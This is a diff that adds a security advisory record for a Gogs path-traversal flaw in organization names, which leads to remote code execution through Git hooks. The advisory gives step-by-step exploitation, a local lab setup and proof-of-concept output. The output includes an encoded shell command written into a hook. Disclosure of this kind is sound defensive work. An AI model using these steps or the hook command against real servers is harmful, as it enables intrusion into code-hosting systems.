@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-c39w-43gm-34h5",
+  "modified": "2026-06-23T17:15:10.658986605Z",
+  "published": "2026-06-23T17:10:50Z",
+  "aliases": [
+    "CVE-2026-52813"
+  ],
+  "summary": "Gogs has Path Traversal in organization name that results in RCE through Git hooks",
+  "details": "### Summary\n\nOrganization names containing path traversal sequences (`../`) are accepted by Gogs, and repositories under them are written to paths following these path traversals. This allows storing/retrieving data for repositories at arbitrary locations on the filesystem.\nBy creating nested structure of Git repositories, one can overwrite the other's `hooks` configuration to result in Remote Code Execution (RCE).\n\n### Details\n\nDuring organization creation, `internal/database/org.go` calls `os.MkdirAll(repox.UserPath(org.Name))` without sanitizing `org.Name`. \n\nhttps://github.com/gogs/gogs/blob/d7571322a04a29476d4241406ed50bf7eef0a5b7/internal/database/org.go#L165\n\nRepository creation uses this name to decide where to write the Git bare repository's (`org/name.git`). By setting the org name to `../../../../tmp/test`, and creating a repository under that organization, it gets written under `/tmp/test` on the server.\n\nhttps://github.com/gogs/gogs/blob/d7571322a04a29476d4241406ed50bf7eef0a5b7/internal/repox/repox.go#L57-L58\n\nAn attacker can abuse this in a clever way by writing to the `/data/gogs/data/tmp/local-r/1` directory, being a local worktree of the git repositories inside of Gogs. These directories are editable by Git. By creating a repository nested inside of there, files like `config` and `hooks/update` are now referenced through the path traversal, and are editable by Git. This allows the attacker to edit the `hooks/update` script with malicious Bash commands and then to trigger the hook.\n\nThe steps to exploit this inside of Gogs are roughly (ignoring some syncing dummy actions):\n\n1. Create regular outer repository and get its ID\n2. Create organization named `../../../../data/gogs/data/tmp/local-r/{ID}/nested`\n3. Create a repository inside this organization (eg. `rce`), which will be written into the local clone of the outer repository\n4. From the outer repository, edit `nested/rce.git/hooks/update` to contain malicious shell commands\n5. Interact with the `rce` repository again to trigger the updated hook, and RCE is achieved\n\n### PoC\n\n1. Set up a default Gogs instance by saving the following content to `docker-compose.yml` and running `docker compose up`:\n\n```yml\nservices:\n  db:\n    image: postgres:16-alpine\n    environment:\n      POSTGRES_USER: gogs\n      POSTGRES_PASSWORD: gogs\n      POSTGRES_DB: gogs\n    volumes:\n      - postgres-data:/var/lib/postgresql/data\n    restart: unless-stopped\n    healthcheck:\n      test: [ \"CMD-SHELL\", \"pg_isready -U gogs -d gogs\" ]\n      interval: 5s\n      timeout: 5s\n      retries: 5\n\n  gogs:\n    image: gogs/gogs\n    depends_on:\n      db:\n        condition: service_healthy\n    ports:\n      - \"3000:3000\"\n    volumes:\n      - gogs-data:/data\n    restart: unless-stopped\n\nvolumes:\n  gogs-data:\n  postgres-data:\n```\n\n2. Visit http://localhost:3000, set the *Host* to `db:5432` and *Password* to `gogs`. Under *Admin Account Settings* configure your admin account\n3. As the attacker, register an account with username `attacker` and password `attacker` at http://localhost:3000/user/sign_up\n4. As the attacker, run the following script (in gist to avoid cluttering this advisory):\n\nhttps://gist.github.com/JorianWoltjer/4b72063338b27140f4439c524d98f2b9\n\nThe output should look like:\n\n```shell\n$ python3 gogs-rce.py\nstep 1 token ok\nstep 2 create personal repo 201 full_name attacker/writer-bd426045\nstep 3 web editor new file on attacker / writer-bd426045\nstep 4 GET writer repo -\u003e local-r 1\nstep 5 create org 201 local-r 1 username ../../../../data/gogs/data/tmp/local-r/1/nested\nstep 6 get org 200 username ../../../../data/gogs/data/tmp/local-r/1/nested\nstep 7 create repo 201 full_name ../../../../data/gogs/data/tmp/local-r/1/nested/rce-b175aca7 html_url http://localhost:3000/../../../../data/gogs/data/tmp/local-r/1/nested/rce-b175aca7 clone_url http://localhost:3000/../../../../data/gogs/data/tmp/local-r/1/nested/rce-b175aca7.git\nstep 8 get repo 200 owner.username ../../../../data/gogs/data/tmp/local-r/1/nested full_name ../../../../data/gogs/data/tmp/local-r/1/nested/rce-b175aca7 empty False\nCloning into '/tmp/poc-writer-fy4k5064'...\nremote: Enumerating objects: 6, done.\nremote: Counting objects: 100% (6/6), done.\nremote: Compressing objects: 100% (3/3), done.\nremote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)\nUnpacking objects: 100% (6/6), 491 bytes | 491.00 KiB/s, done.\nstep 9 clone writer repo -\u003e /tmp/poc-writer-fy4k5064\n[master 3cf84b2] poc: nested/rce-b175aca7.git hook path\n 1 file changed, 1 insertion(+)\n create mode 100755 nested/rce-b175aca7.git/hooks/update\nstep 10 write nested/rce-b175aca7.git/hooks/update with echo 'aWQ=' | base64 -d | bash \u003e pwned\nEnumerating objects: 7, done.\nCounting objects: 100% (7/7), done.\nDelta compression using up to 14 threads\nCompressing objects: 100% (2/2), done.\nWriting objects: 100% (6/6), 1022 bytes | 1022.00 KiB/s, done.\nTotal 6 (delta 0), reused 0 (delta 0), pack-reused 0\nTo http://localhost:3000/attacker/writer-bd426045.git\n   b0b9886..3cf84b2  master -\u003e master\nstep 11 push writer\nstep 12 API new file on attacker / writer-bd426045\nstep 13 API new file on org ../../../../data/gogs/data/tmp/local-r/1/nested / rce-b175aca7\nstep 14 API new file on attacker / writer-bd426045\nstep 15 GET raw pwned 200 http://localhost:3000/attacker/writer-bd426045/raw/master/nested/rce-b175aca7.git/pwned\n\n=== COMMAND OUTPUT ===\nuid=1000(git) gid=1000(git) groups=1000(git)\n```\n\n### Impact\n\nIn the default setting, users can self-register and then create their own organizations. From here they can perform this exploit to achieve RCE as the `git` user.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "gogs.io/gogs",
+        "purl": "pkg:golang/gogs.io/gogs"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.14.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-c39w-43gm-34h5/GHSA-c39w-43gm-34h5.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gogs/gogs/security/advisories/GHSA-c39w-43gm-34h5"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gogs/gogs/pull/8334"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gogs/gogs/commit/f6acd467305943aae8403cbac81f0118dd1235d7"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gogs/gogs"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gogs/gogs/releases/tag/v0.14.3"
+    }
+  ]
+}
